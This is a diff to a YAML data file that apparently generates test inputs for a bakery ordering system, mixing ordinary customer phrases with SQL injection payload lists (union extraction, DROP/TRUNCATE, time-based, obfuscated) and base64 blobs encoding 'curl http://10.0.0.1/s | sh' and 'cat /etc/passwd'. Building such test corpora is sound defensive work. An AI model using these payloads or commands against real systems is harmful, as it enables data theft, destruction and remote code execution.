@@ -55,21 +55,22 @@ attacker_ips: [10.66.0.23, 45.33.32.156, 185.220.101.4, 192.0.2.10, 203.0.113.7]
 b64_blobs: [Y2F0IC9ldGMvcGFzc3dk, d2hvYW1pO2lk, Y3VybCBodHRwOi8vMTAuMC4wLjEvcyB8IHNo, aWQ7dW5hbWUgLWE=]
 
 sqli_payloads:
-  tautology: ["' OR '1'='1", "' or 1=1--", "\" OR \"\"=\"", "admin' --", "' OR 'a'='a' #", "1' or '1'='1' -- -",
+  tautology: ["\" or 1=1 -- ", "' OR 2>1 --", "1 OR 1=1", "' || '1'='1", "') OR 1=1 --", "x' or 1=1 or 'x'='y", "' OR ''='", "1' OR true--", "' OR '1'='1", "' or 1=1--", "\" OR \"\"=\"", "admin' --", "' OR 'a'='a' #", "1' or '1'='1' -- -",
               "') or ('1'='1", "' OR 1=1 LIMIT 1;--", "x' OR 'x'='x"]
-  union: ["' UNION SELECT NULL--", "1 UNION SELECT username, password FROM users--",
+  union: ["' UNION ALL SELECT NULL,NULL,NULL-- -", "1 union select 1,group_concat(table_name) from information_schema.tables--", "') UNION SELECT email,password_hash FROM customers--", "-5 UNION SELECT 1,@@version,3#", "' UnIoN SeLeCt username,2 fRoM admin_users--", "999 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='orders'--", "' union select null,concat(user,0x3a,password) from mysql.user-- -", "' UNION SELECT NULL--", "1 UNION SELECT username, password FROM users--",
           "' union all select 1,2,3,version()-- -", "-1 UNION SELECT table_name,2 FROM information_schema.tables--",
           "0 union select load_file('/etc/passwd')"]
-  stacked: ["1; DROP TABLE users--", "'; EXEC xp_cmdshell('dir')--", "1; INSERT INTO admins VALUES('x','y')--",
+  stacked: ["1; SELECT pg_sleep(5)--", "'; DELETE FROM orders WHERE 1=1--", "1; TRUNCATE TABLE customers;--", "'); DROP TABLE products;--", "1; CREATE USER hacker IDENTIFIED BY 'x';--", "'; SHUTDOWN;--", "5; ALTER TABLE users ADD is_admin int;--", "1; DROP TABLE users--", "'; EXEC xp_cmdshell('dir')--", "1; INSERT INTO admins VALUES('x','y')--",
             "'; UPDATE users SET role='admin' WHERE '1'='1"]
-  time: ["1' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "1) AND pg_sleep(5)--",
+  time: ["'; SELECT pg_sleep(10)--", "1' WAITFOR DELAY '0:0:10'--", "' OR IF(1=1,SLEEP(3),0)--", "1 AND (SELECT * FROM (SELECT(SLEEP(4)))x)", "1' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "1) AND pg_sleep(5)--",
          "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--", "1 AND BENCHMARK(5000000,MD5(1))"]
-  comment: ["admin'/**/OR/**/1=1#", "1'/**/UNION/**/SELECT/**/1,2--", "' oR/**/'1'/**/=/**/'1",
+  comment: ["1'/*!50000union*/select 1,2--", "admin'-- -", "' oR 1=1;%00", "1' UnIoN/**/SeLeCt/**/null--", "%27%20OR%20%271%27%3D%271", "1'%0aOR%0a1=1--", "admin'/**/OR/**/1=1#", "1'/**/UNION/**/SELECT/**/1,2--", "' oR/**/'1'/**/=/**/'1",
             "1%27%20or%201%3D1--"]
   error: ["' AND extractvalue(1,concat(0x7e,version()))--", "' AND 1=CONVERT(int,@@version)--",
           "' AND updatexml(1,concat(0x7e,user()),1)--"]
-  probe: ["1' ORDER BY 1--", "1' ORDER BY 5-- -", "' GROUP BY 1,2--", "1 ORDER BY 10#", "' HAVING 1=1 --",
+  probe: ["1' ORDER BY 3#", "' ORDER BY 100-- -", "1 GROUP BY 2 HAVING 1=1--", "{user}')--", "' AND 1=0 UNION SELECT 1--", "1' AND '1'='1", "1' AND '1'='2", "1'\"", "' AND SLEEP(0)--", "1' ORDER BY 1--", "1' ORDER BY 5-- -", "' GROUP BY 1,2--", "1 ORDER BY 10#", "' HAVING 1=1 --",
           "1' AND 1=1--", "1' AND 1=2--", "1 AND 1=1", "' AND 'x'='x", "{user}'#", "{user}'--", "{user}' /*"]
+  in_text: ["{cust}' OR '1'='1", "{cust}' UNION SELECT username,password FROM users--", "{cust}'; DROP TABLE orders;--", "{cust}' AND SLEEP(5)--", "{cust}' ORDER BY 3--", "{cust}') OR ('1'='1", "{cust}\" OR 1=1 --", "{cust}' UNION ALL SELECT NULL,version()-- -", "{cust}' AND 1=2 UNION SELECT 1,2--"]
   blind: ["1' AND SUBSTRING(@@version,1,1)='5'--", "1 AND ASCII(SUBSTR((SELECT user()),1,1))>100",
           "' AND (SELECT COUNT(*) FROM users)>0--", "1' AND LENGTH(database())>3--", "' OR EXISTS(SELECT 1 FROM admin)--"]
 
@@ -108,7 +109,8 @@ cust_people: ["mom", "dad", "my wife", "my husband", "grandpa", "nani", "my son"
 cust_requests: ["less sugar", "no nuts", "eggless please", "extra frosting", "no candles", "add candles", "sugar-free",
                 "buttercream only", "no fondant", "write the name in gold", "pack it separately", "keep it cold",
                 "deliver after 6pm", "call before coming", "leave at reception", "ring twice", "pickup at 4",
-                "change the date", "cancel the extra box", "same as last time"]
+                "change the date", "cancel the extra box", "same as last time",
+                "or tomorrow if possible", "or maybe next week", "or whatever is fresh", "or a smaller size", "or pickup instead"]
 cust_reasons: ["birthday", "anniversary", "farewell", "baby shower", "office party", "b'day surprise", "get well soon",
                "housewarming", "kids party", "wedding", "diwali", "christmas", "promotion party"]
 cust_feelings: ["loved it", "best cake ever", "it was amazing", "a bit too sweet", "arrived late but tasted great",
